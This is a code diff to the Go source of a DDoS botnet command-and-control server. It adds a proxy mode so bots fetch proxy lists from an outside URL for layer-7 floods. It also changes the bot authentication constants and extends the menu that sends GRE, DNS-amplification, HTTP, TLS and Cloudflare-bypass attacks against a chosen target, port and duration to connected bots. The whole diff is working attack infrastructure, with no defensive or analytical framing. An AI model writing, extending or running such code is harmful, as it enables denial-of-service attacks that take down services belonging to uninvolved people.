@@ -30,8 +30,8 @@ const (
 	USER_SERVER_PORT = "420"
 
 	// Authentication  these must match bot
-	MAGIC_CODE       = "saj95sciW1zQSXD9"
-	PROTOCOL_VERSION = "r2.7-stable"
+	MAGIC_CODE       = "oDU92ei#0OZqRueu"
+	PROTOCOL_VERSION = "proto55"
 )
 
 type BotConnection struct {
@@ -566,6 +566,9 @@ func (c *client) writeAttackCommands(conn net.Conn) {
 		"║    !gre       <ip/url> <port> <time>  - GRE flood            ║",
 		"║    !dns       <ip/url> <port> <time>  - DNS amplification    ║",
 		"║    !stop                              - Stop all attacks     ║",
+		"║                                                              ║",
+		"║  \033[1;35mProxy Mode (L7 only)\033[1;97m: Add -p <proxy_url.txt> at the end   ║",
+		"║    Example: !http site.com 443 60 -p http://x.com/proxy.txt  ║",
 	}
 	c.writeSection(conn, commands)
 }
@@ -1025,7 +1028,7 @@ func handleRequest(conn net.Conn) {
 					}
 
 					if len(parts) < 4 {
-						conn.Write([]byte("Usage: method ip/url port duration\r\n"))
+						conn.Write([]byte("Usage: method ip/url port duration [-p proxy_url.txt]\r\n"))
 						continue
 					}
 
@@ -1033,6 +1036,20 @@ func handleRequest(conn net.Conn) {
 					ip := parts[1]
 					port := parts[2]
 					duration := parts[3]
+
+					// Check for proxy mode: -p <proxy_url>
+					proxyMode := false
+					proxyURL := ""
+					if len(parts) >= 6 && parts[4] == "-p" {
+						// Proxy mode only for L7 methods
+						if method == "!http" || method == "!https" || method == "!tls" || method == "!cfbypass" {
+							proxyMode = true
+							proxyURL = parts[5]
+						} else {
+							conn.Write([]byte("\033[1;33m⚠ Proxy mode (-p) only supported for L7 methods: !http, !https, !tls, !cfbypass\r\n\033[0m"))
+						}
+					}
+
 					dur, err := time.ParseDuration(duration + "s")
 					if err != nil {
 						conn.Write([]byte("Invalid duration format.\r\n"))
@@ -1043,6 +1060,9 @@ func handleRequest(conn net.Conn) {
 					conn.Write([]byte(fmt.Sprintf("\033[38;5;208m⚡ Port:\033[0m %s\r\n", port)))
 					conn.Write([]byte(fmt.Sprintf("\033[38;5;208m⚡ Duration:\033[0m %ss\r\n", duration)))
 					conn.Write([]byte(fmt.Sprintf("\033[38;5;208m⚡ Method:\033[0m %s\r\n", method)))
+					if proxyMode {
+						conn.Write([]byte(fmt.Sprintf("\033[38;5;208m⚡ Proxy Mode:\033[0m Enabled (fetching from %s)\r\n", proxyURL)))
+					}
 					conn.Write([]byte("\r\n"))
 
 					ongoingAttacks[conn] = attack{
@@ -1059,7 +1079,12 @@ func handleRequest(conn net.Conn) {
 						conn.Write([]byte("\033[38;5;46m✓ Attack completed and removed.\033[0m\n"))
 					}(conn, ongoingAttacks[conn])
 
-					sendToBots(fmt.Sprintf("%s %s %s %s", method, ip, port, duration))
+					// Build command string with optional proxy flag
+					if proxyMode {
+						sendToBots(fmt.Sprintf("%s %s %s %s -p %s", method, ip, port, duration, proxyURL))
+					} else {
+						sendToBots(fmt.Sprintf("%s %s %s %s", method, ip, port, duration))
+					}
 
 				case "!stop":
 					if !c.canUseDDoS() {
